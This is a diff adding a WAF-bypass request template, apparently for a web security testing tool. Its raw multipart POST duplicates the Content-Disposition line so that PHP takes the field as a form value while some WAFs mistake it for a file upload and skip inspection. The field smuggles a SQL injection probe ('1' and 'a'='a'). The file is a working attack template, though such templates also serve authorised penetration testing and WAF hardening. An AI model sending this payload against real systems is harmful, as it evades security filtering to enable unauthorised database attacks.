@@ -1,0 +1,20 @@
+# @name: multipart双写上传描述行
+# @tags: post,multipart,double,content-disposition,php,id,bypass
+# @color: amber
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: multipart_double_content_disposition
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: 双写 Content-Disposition 行：PHP 取第一行(无 filename，进入 $_POST)，部分 WAF 取第二行(含 filename，误判为文件上传而跳过内容检测)。参考 do9gy multipart Part1 第2条。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: multipart/form-data; boundary=a
+
+--a
+Content-Disposition: form-data; name="id"
+Content-Disposition: form-data; name="id"; filename="1.png"
+
+1' and 'a'='a
+--a--
